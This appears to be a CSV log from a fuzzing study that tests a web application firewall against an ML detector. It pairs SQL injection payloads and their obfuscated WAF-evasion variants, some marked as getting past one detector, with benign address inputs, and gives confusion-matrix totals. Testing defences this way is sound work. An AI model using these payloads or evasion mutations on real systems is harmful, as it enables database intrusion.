Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-08-27T11:05:14.286882,"1"""" order by 1#",403,200,403,waf_incorrect_ml_correct,"(SELECT
 AND 1)""""/*$oy]*/order by '""' like '""'#",2024-08-27T11:05:15.746511,403,403,both_correct,"(selEcT
 &&/**/(SELECT	(SELECT '.SG4'!='.SG4k')))""""/*$oy]*/order by '""' LikE '""'#SH",2024-08-27T11:05:22.096626,403,403,both_correct,"(selECT
 && (SELECt
(selEcT '.SG4' NOT LIKE '.SG4k')))""""/**/order by '""' Like '""'#SHD[",2024-08-27T11:05:28.501055,403,403,both_correct,"(seLect
 && (selecT (selecT '.SG4'/**/not like '.SG4k')))""""/**/order by '""' LikE '""'#SHD[",2024-08-27T11:05:34.317192,403,403,both_correct,"(selECt   aND  (sElecT (SeleCt '.SG4'/**/not like/**/'.SG4k')))""""/**/order by '""' LIke '""'#SHD[_l",2024-08-27T11:05:41.065640,403,200,waf_correct_ml_incorrect
12,2024-08-27T11:05:46.245276,"conde de olocau, s/n, 3g",200,200,200,both_correct,"conde	de/**/olocau, s/n, 3g",2024-08-27T11:05:47.589498,200,200,both_correct,"conde de olocau, s/n, 3g",2024-08-27T11:05:49.969211,200,200,both_correct,"conde de/**/olocau, s/n,	3g",2024-08-27T11:05:52.099679,200,200,both_correct,"conde de olocau, s/n,
3g",2024-08-27T11:05:54.529024,200,200,both_correct,"conde de/*K4M*/olocau,
s/n,
3g",2024-08-27T11:05:56.687647,200,200,both_correct
13,2024-08-27T11:05:59.475128,"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",403,403,403,both_correct,"1%')))	and/**/8148=like('abcdefg',upper(hex(randomblob( AND 'Se'='Se'/(sElEct 2)))))--",2024-08-27T11:06:02.916337,403,200,waf_correct_ml_incorrect," aNd (sELECT 1)%'))) and/**/8148=like('abcdefg',upper(hex(randomblob(/**/AND 'Se'='Se'/(SELECt 4721<>4722)))))--",2024-08-27T11:06:08.697762,403,403,both_correct," And (sELeCt 1)%')))	and  AND 1=like('abcdefg',upper(hex(randomblob(/**/AND 'Se'='Se'/(SELECt 0x1271 not like ')G' NOT LIKE ')GX')))))--",2024-08-27T11:06:14.985719,200,403,waf_incorrect_ml_correct," aNd (sELEcT (SELECT 'v\Qx'='v\Qx'))%'))) and  AND  AND 1=like('abcdefg',upper(hex(randomblob( AND 'Se'='Se'/(SELECt 0x1271 not like ')G' NOT LIKE ')GX')))))--",2024-08-27T11:06:22.193797,200,403,waf_incorrect_ml_correct," aNd (SElEct (sElecT 'v\Qx' LikE 'v\Qx'))%'))) and  AND  AND (SELECT	(SELECT 1)<>1431)=like('abcdefg',upper(hex(randomblob( AND 'Se'='Se'/(SELECt 0x1271 not like ')G' NOT LIKE/**/')GX')))))--",2024-08-27T11:06:29.958038,200,403,waf_incorrect_ml_correct
14,2024-08-27T11:06:39.434124,"calle capitan godoy beltran, 120",200,200,200,both_correct,"calle capitan	godoy beltran,/**/0x78",2024-08-27T11:06:40.829623,200,200,both_correct,"calle capitan
godoy beltran, 0x78",2024-08-27T11:06:43.365496,200,200,both_correct,"calle/*/.O*/capitan
godoy beltran,	0x78",2024-08-27T11:06:45.840767,200,200,both_correct,"calle/*/.O*/capitan
godoy/**/beltran,
0x78",2024-08-27T11:06:48.525892,200,200,both_correct,"calle/*/.O*/capitan/**/godoy/**/beltran,
0x78",2024-08-27T11:06:51.352048,200,200,both_correct
15,2024-08-27T11:06:54.256347,1;select (case when (4624=4844) then 4624 else 1/(select 0) end)--,403,403,403,both_correct,"1;SeLeCT (cASE wHeN (4624=(SELECT 1)) THen/*d+6*/4034 not like 4035
ElsE 1/(SelEcT (SELECT 0)) EnD)--",2024-08-27T11:06:57.029851,403,403,both_correct,(SELECT 1);select (Case wHen (4624 like (SELEcT 1)) Then/**/4034/**/not like 4035 else 1/(SELeCt (Select 0x0)) enD)--,2024-08-27T11:07:02.622006,403,403,both_correct,(SeleCt 1);SeLecT (case wHeN ((SeLEcT 1) liKE	(seLECt 1)) then/**/0x24bd<>9406 not like 4035 eLsE 1/(SelEcT (seLecT 0x0)) END)--,2024-08-27T11:07:08.432197,403,403,both_correct,"(SelECt 'e,3' NOT LIKE 'e,3s');SeleCT (casE WHEN ((sELeCt 1) likE (SelecT 1)) Then 0x24bd!= and 0x1 not like 4035 ElSE 1/(sEleCT (SElEct 0x0)) EnD)--",2024-08-27T11:07:15.314083,403,403,both_correct,"(sELecT 'e,'X'='X'' not like 'e,3s');SeLeCT (CAsE WHEN ((seleCT 1) LiKE (seleCT/**/1)) THEn 0x24bd!= AnD 0x1
not like 4035 ELSE (SELECT 0x1)/(seLect (SelECT 0x0)) eND)--",2024-08-27T11:07:23.693726,403,403,both_correct
16,2024-08-27T11:07:32.738017,"1"""")) as femc where 1313=1313 and 4595=4595#",403,200,403,waf_incorrect_ml_correct,"1"""")) As
femc wheRe  AND 1=0x521 aND/**/4595 like '_'f<' LIKE '_'f<'#",2024-08-27T11:07:34.673068,200,403,waf_incorrect_ml_correct,"(sElECT 1)"""")) As	femc WheRE  and '+
' not like/**/'+
!'=0x521 aND/**/(SEleCT 4595) lIKe '_'f<' LIKE '_'f<'#s",2024-08-27T11:07:38.972445,403,200,waf_correct_ml_incorrect,"(SeLEct  OR 0)"""")) as
femc wHerE  AND '+
' not like '+
!'=0x521 anD/**/(sElect (sELeCT 6697 NOT LIKE 6698)) LiKE '_'f<' LIKE '_'f<'#s1",2024-08-27T11:07:44.916592,403,403,both_correct,"(seLeCt  oR (sElect  OR 0))"""")) AS	femc WHeRe  aNd '+
' not like '+
!'=0x521 aND (SElect (selEct 6697 not like 9388<>9389)) like '_'f<' LIKE '_'f<'#s1",2024-08-27T11:07:52.380090,403,403,both_correct,"(SELecT  OR (selecT  or 0x0))"""")) aS	femc wHere/*x8:2j*/ and '+
' not like '+
!' like 0x521 aNd (sELECT (SElECT 6697 not like 9388<>(SELECT 3189=3189))) liKE
'_'f<' LIKE '_'f<'#s1",2024-08-27T11:08:00.223758,403,403,both_correct
17,2024-08-27T11:08:09.505344,paris-loisel@viavilano.cr,200,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T11:08:11.182485,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T11:08:13.548911,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T11:08:15.652463,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T11:08:18.043546,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T11:08:20.233452,200,200,both_correct
18,2024-08-27T11:08:22.360454,"1"""";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and """"fkdx"""" like """"fkdx",403,403,200,waf_correct_ml_incorrect,"5073 not like (sElEcT  oR 0)"""";SElECt count(*) frOm rdb$fields aS	t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions As/**/t4 and """"fkdx"""" LIkE """"fkdx",2024-08-27T11:08:27.586246,403,200,waf_correct_ml_incorrect,"(SeLEcT 5073) not like (SeLecT  Or  OR 9251 NOT LIKE 9252)"""";seLect/**/count(*) frOM rdb$fields aS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions aS/**/t4 And """"fkdx"""" Like """"fkdx",2024-08-27T11:08:35.979156,403,200,waf_correct_ml_incorrect,"(sElEct 'G' Like 'G') not like (select  Or  OR 	and 1 NOT LIKE 0x2424)"""";selEct/**/count(*)/*`q*/FROM rdb$fields aS t1,rdb$types as t2,rdb$collations aS t3,rdb$functions as/**/t4 aNd """"fkdx"""" LikE """"fkdx",2024-08-27T11:08:46.111988,403,200,waf_correct_ml_incorrect,"(sELEct 'G' LIkE 'G') not like (SELeCT  Or  || 	anD	(SeleCt (SELecT '''<>'']')) NOT LIKE 0x2424)"""";seLecT count(*)/*; %P\*/fROM rdb$fields aS t1,rdb$types as t2,rdb$collations AS t3,rdb$functions aS/**/t4 and """"fkdx"""" LIKE """"fkdx",2024-08-27T11:08:56.842361,403,200,waf_correct_ml_incorrect,"(SELeCT  OR 9689=9689) not like (seLECT  or  ||/**/	anD	(SELect	(SeLECT '''<>'']')) not like 0x2424)"""";SeLeCT count(*)/*h*/frOm rdb$fields As t1,rdb$types As t2,rdb$collations as t3,rdb$functions aS/**/t4 And """"fkdx"""" lIKe """"fkdx",2024-08-27T11:09:10.689106,403,200,waf_correct_ml_incorrect
19,2024-08-27T11:09:21.669235,1' and 5967=4184#,403,403,403,both_correct,(SELECT 1)'	and/*MI*/ AND 1=':'<>'::'#,2024-08-27T11:09:22.462725,403,403,both_correct,"(SEleCt '""'<>'""u')' and/*{^!_;*/ AND  AND/**/(SELECT 1)=':'<>'::'#",2024-08-27T11:09:25.142700,403,403,both_correct,"(SEleCt '""'
NOT LIKE '""u')' and/*K*/ AND  AND (SELECT 0x1)=':'<>'::'#",2024-08-27T11:09:28.923305,403,403,both_correct,"(Select '""'
not like	'""u')' and/**/ AND  AND/**/(SELECT 0x1)=':'<>'::'#e5",2024-08-27T11:09:32.926053,403,403,both_correct,"(selecT '""'
not like	'""u')'	and  AND  AND/**/(SELECT 0x1)=':'<>'::'#e5n",2024-08-27T11:09:37.428298,403,403,both_correct
20,2024-08-27T11:09:41.410953,"c/ja del indiano, s/n,",200,200,403,waf_correct_ml_incorrect,"c/ja/**/del
indiano, s/n,",2024-08-27T11:09:42.455220,200,200,both_correct,"c/ja/**/del	indiano,/**/s/n,",2024-08-27T11:09:44.681612,200,200,both_correct,"c/ja del
indiano,/*iT
i*/s/n,",2024-08-27T11:09:47.061628,200,200,both_correct,"c/ja/**/del indiano,/**/s/n,",2024-08-27T11:09:49.411571,200,200,both_correct,"c/ja/*mnO+2*/del	indiano, s/n,",2024-08-27T11:09:51.770111,200,200,both_correct

Overall Results
WAF TP,64
WAF TN,33
WAF FP,3
WAF FN,20
ML TP,55
ML TN,30
ML FP,6
ML FN,29

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,71,14
ML Incorrect,26,9
